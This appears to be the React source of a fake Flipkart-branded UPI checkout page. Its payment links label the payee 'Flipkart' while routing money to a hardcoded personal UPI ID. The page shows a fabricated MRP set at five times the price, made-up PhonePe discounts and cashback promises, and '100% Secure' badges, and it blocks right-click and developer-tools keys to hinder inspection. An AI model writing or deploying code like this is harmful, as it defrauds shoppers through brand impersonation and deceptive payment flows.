import React, { useContext, useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { AppContext } from "../context/AppContext";

const detectOS = () => {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return "ios";
  if (/android/.test(ua)) return "android";
  return "other";
};

export const Payment = () => {
  const navigate = useNavigate();
  const { cart, setLoadingOverlay } = useContext(AppContext);
  const os = detectOS();

  const [upiId, setUpiId] = useState("chintanchovatiya@ybl");
  const [selectedUpi, setSelectedUpi] = useState("phonepe");
  const [selectedUPIlink, setSelectedUPIlink] = useState("");

  // Fetch settings to get dynamic UPI ID
  useEffect(() => {
    fetch("/settings.json")
      .then((res) => {
        if (!res.ok) {
          // Fallback to cPanel API if static settings.json is not present
          return fetch("/api/settings").then((r) => r.json());
        }
        return res.json();
      })
      .then((data) => {
        if (data && data.upiId !== undefined) {
          setUpiId(data.upiId);
        }
      })
      .catch((err) => console.error("Error fetching payment settings:", err));
  }, []);

  // Retrieve values from localStorage
  const actualTotal =
    Number(localStorage.getItem("orderSummaryFinalTotal")) ||
    cart.totalPrice ||
    0;

  const totalMrp =
    Number(localStorage.getItem("orderSummaryTotalMrp")) || actualTotal * 5;

  const cashbackAmount = Math.round(actualTotal * 0.4);

  // Disable right-click & common dev tools inside this page for extra security
  useEffect(() => {
    const handleContextMenu = (e) => e.preventDefault();
    const handleKeyDown = (e) => {
      if (
        (e.ctrlKey && (e.key === "I" || e.key === "U" || e.key === "J")) ||
        e.keyCode === 123
      ) {
        e.preventDefault();
      }
    };

    document.addEventListener("contextmenu", handleContextMenu);
    document.addEventListener("keydown", handleKeyDown);

    return () => {
      document.removeEventListener("contextmenu", handleContextMenu);
      document.removeEventListener("keydown", handleKeyDown);
    };
  }, []);

  const handlePaymentSubmit = async (e) => {
    e.preventDefault();
    setLoadingOverlay(true);

    const orderNumber = Math.floor(1000000000 + Math.random() * 9000000000);
    const siteName = "Verified Seller";
    const amt = parseFloat(actualTotal).toFixed(2);
    const os = detectOS();

    let redirectUrl = "";

    switch (selectedUpi) {
      case "gpay":
        redirectUrl = `tez://upi/pay?pa=${upiId}&pn=Online%20Store&tn=Order_Id_${orderNumber}&am=${amt}&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=${encodeURIComponent(siteName)}`;
        break;
      case "phonepe":
        if (os === "android") {
          const payload = {
            p2pPaymentCheckoutParams: {
              checkoutType: "COLLECT",
              initialAmount: Math.round(actualTotal * 100),
              note: {
                type: "text",
                message: "Paying Flipkart",
              },
              supportedInstruments: -1,
            },
            contact: {
              type: "EXTERNAL_MERCHANT",
              name: "Flipkart",
              vpa: upiId,
            },
          };
          const jsonString = JSON.stringify(payload);
          const base64Data = btoa(unescape(encodeURIComponent(jsonString)));
          redirectUrl =
            "phonepe://native?data=" + base64Data + "&id=p2ppayment";
        } else {
          // iOS or other
          redirectUrl = `phonepe://upi//pay?pa=${upiId}&pn=${encodeURIComponent(siteName)}&am=${amt}&cu=INR&tn=${encodeURIComponent(orderNumber)}`;
        }
        break;
      case "paytm":
        redirectUrl = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&pn=${encodeURIComponent(siteName)}&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_${orderNumber}&am=${amt}`;
        break;
      default:
        break;
    }

    try {
      await fetch("/api/payment/process", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          orderNumber: String(orderNumber),
          payType: selectedUpi,
          upiAddress: upiId,
          amount: String(amt),
        }),
      });
    } catch (err) {
      console.error("Failed to log payment backend:", err);
    }

    // Save details locally for verification / success references
    localStorage.setItem("pendingOrderNumber", String(orderNumber));
    localStorage.setItem("pendingPayType", selectedUpi);
    localStorage.setItem("pendingAmount", String(amt));

    setLoadingOverlay(false);

    // Redirect to UPI app intent
    window.location.href = redirectUrl;
    setSelectedUPIlink(redirectUrl);

    // Navigate to local verification spinner page
    navigate(
      `/checkout/verify?orderNumber=${orderNumber}&payType=${selectedUpi}&amt=${amt}`,
    );
  };

  return (
    <main className="bg-gray-100 pb-24 min-h-screen text-gray-900 font-sans max-w-[480px] mx-auto">
      {/* Custom Payment Header */}
      <div className="bg-white px-4 py-3 border-b border-gray-200 sticky top-0 z-50 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <button
            onClick={() => navigate(-1)}
            className="p-1 rounded-lg hover:bg-gray-100 flex items-center justify-center border-0 bg-transparent cursor-pointer"
          >
            <span className="material-icons text-xl text-gray-800">
              arrow_back
            </span>
          </button>
          <div className="flex flex-col">
            <span className="text-[10px] font-medium text-gray-500 uppercase tracking-wider">
              Step 3 of 3
            </span>
            <span className="text-sm font-bold text-gray-900 mt-0.5">
              Payments
            </span>
          </div>
        </div>
        <div className="flex items-center gap-1.5 bg-gray-100 px-3 py-1 rounded-full text-center">
          <img src="/images/lock-icon.svg" className="w-3.5 h-3.5" alt="Lock" />
          <span className="text-[11px] font-bold text-gray-700 whitespace-nowrap">
            100% Secure
          </span>
        </div>
      </div>

      {/* Main Container */}
      <div className="p-3 flex flex-col gap-3 mt-1">
        {/* Payment Options Header & Options */}
        <div className="bg-[#F5F5F5] rounded-xl overflow-hidden border border-gray-200/80">
          <div className="bg-white px-4 py-3 border-b border-gray-100 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <img src="/images/upi.svg" className="w-7 h-7" alt="UPI" />
              <span className="text-sm font-semibold text-gray-900">
                UPI Payments
              </span>
            </div>
            <img
              src="/images/up_arw.png"
              className="w-4 h-4 object-contain"
              alt="Arrow"
            />
          </div>

          <form
            onSubmit={handlePaymentSubmit}
            className="bg-white p-3 flex flex-col gap-3"
          >
            {/* PhonePe Option */}
            <div
              onClick={() => setSelectedUpi("phonepe")}
              className={`flex items-start justify-between p-3.5 rounded-lg border-2 cursor-pointer transition ${
                selectedUpi === "phonepe"
                  ? "border-purple-600 bg-purple-50/20"
                  : "border-gray-100 bg-gray-50/30"
              }`}
            >
              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="upi"
                  checked={selectedUpi === "phonepe"}
                  onChange={() => setSelectedUpi("phonepe")}
                  className="w-5 h-5 mt-0.5 accent-purple-600 cursor-pointer"
                />
                <div className="-mt-0.5">
                  <div className="flex items-center gap-1.5 font-bold text-sm text-gray-900">
                    <span>₹{actualTotal.toLocaleString("en-IN")}</span>
                    <span className="text-gray-300">|</span>
                    <span>PhonePe</span>
                  </div>
                  <p className="text-[11px] font-semibold text-purple-700 mt-1">
                    30% Extra Discount By PhonePe
                  </p>
                </div>
              </div>
              <img
                src="/images/phonepe.svg"
                className="w-7 h-7 object-contain"
                alt="PhonePe"
              />
            </div>

            {/* GPay Option */}
            {/* <div
              onClick={() => setSelectedUpi("gpay")}
              className={`flex items-start justify-between p-3.5 rounded-lg border-2 cursor-pointer transition ${
                selectedUpi === "gpay" ? "border-green-600 bg-green-50/20" : "border-gray-100 bg-gray-50/30"
              }`}
            >
              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="upi"
                  checked={selectedUpi === "gpay"}
                  onChange={() => setSelectedUpi("gpay")}
                  className="w-5 h-5 mt-0.5 accent-green-600 cursor-pointer"
                />
                <div className="-mt-0.5">
                  <div className="flex items-center gap-1.5 font-bold text-sm text-gray-900">
                    <span>₹{actualTotal.toLocaleString("en-IN")}</span>
                    <span className="text-gray-300">|</span>
                    <span>GPay</span>
                  </div>
                  <p className="text-[11px] font-semibold text-green-700 mt-1">
                    20% Extra Discount By Gpay
                  </p>
                </div>
              </div>
              <img src="/images/gpay_icon.svg" className="w-7 h-7 object-contain" alt="GPay" />
            </div> */}

            {/* Paytm Option */}
          

            {/* Cash on Delivery (Disabled) */}
            <div className="flex items-start justify-between p-3.5 rounded-lg border border-dashed border-gray-200 bg-gray-100/50 opacity-60 pointer-events-none">
              <div className="flex items-start gap-3">
                <input
                  type="radio"
                  name="upi"
                  disabled
                  className="w-5 h-5 mt-0.5 accent-gray-400"
                />
                <div className="-mt-0.5">
                  <div className="flex items-center gap-1.5 font-bold text-sm text-gray-500">
                    <span>₹{actualTotal.toLocaleString("en-IN")}</span>
                    <span className="text-gray-300">|</span>
                    <span>Cash on Delivery</span>
                  </div>
                  <p className="text-[11px] font-semibold text-red-500 mt-1">
                    Not available on Offer Products
                  </p>
                </div>
              </div>
              <img
                src="/images/cod.png"
                className="w-7 h-7 object-contain"
                alt="COD"
              />
            </div>
          </form>
        </div>

        {/* Cashback Card */}
        <div className="bg-[#E7F9ED] border border-[#d2f3db] rounded-xl p-4 flex flex-col gap-2">
          <div className="flex items-center gap-1.5 text-green-800 font-bold text-[14px]">
            <span>₹{cashbackAmount} Cashback on First Order!</span>
          </div>
          <p className="text-xs text-green-700 leading-relaxed font-medium">
            Place your order on this Flipkart product and get{" "}
            <span className="font-bold text-green-800">₹{cashbackAmount}</span>{" "}
            cashback! Cashback will be credited to your original UPI payment
            method (QR/PhonePe/Paytm/Gpay) after your order is delivered to you.
          </p>
        </div>

        {/* Dynamic Breakdown Card */}
        <div className="bg-[#F1F5FF] border border-[#e1e9ff] rounded-xl p-4 flex flex-col gap-3 font-medium text-gray-800 text-sm shadow-sm">
          <div className="flex justify-between items-center text-gray-600 text-xs font-semibold">
            <span>Price (1 item)</span>
            <span>₹{actualTotal.toLocaleString("en-IN")}</span>
          </div>
          <div className="flex justify-between items-center text-green-600 text-xs font-semibold">
            <span>Delivery Charges</span>
            <span>FREE</span>
          </div>
          <div className="flex justify-between items-center text-gray-600 text-xs font-semibold">
            <span>Discount fee</span>
            <span className="line-through text-gray-400">
              ₹{totalMrp.toLocaleString("en-IN")}
            </span>
          </div>

          <div className="border-t border-dashed border-[#c4c4c4] pt-3 flex justify-between items-center text-blue-700 font-bold text-[15px]">
            <div className="flex items-center gap-1">
              <span>Total Amount</span>
              <img src="/images/uparrow.png" className="w-2.5 h-2.5" alt="" />
            </div>
            <span>₹{actualTotal.toLocaleString("en-IN")}</span>
          </div>
        </div>

        {/* Security Badge Image */}
        <div className="rounded-xl overflow-hidden shadow-sm border border-gray-200">
          <img
            src="/images/SecurePay.jpg"
            className="w-full object-cover"
            alt="100% Secure Payments"
          />
        </div>
      </div>

      {/* Sticky Bottom Actions */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-3.5 flex justify-between items-center max-w-[480px] mx-auto z-45 shadow-lg">
        <div className="flex flex-col">
          <span className="text-[17px] font-black text-gray-900">
            ₹{actualTotal.toLocaleString("en-IN")}
          </span>
          <span className="text-[10px] text-gray-400 font-semibold uppercase tracking-wider">
            Total Payable Amount
          </span>
        </div>
        <button
          onClick={handlePaymentSubmit}
          className="bg-[#FFC107] border-none text-black font-bold px-10 py-3 rounded-lg hover:bg-yellow-500 cursor-pointer text-sm shadow transition uppercase tracking-wider"
        >
          Proceed To Pay
        </button>
      </div>
    </main>
  );
};
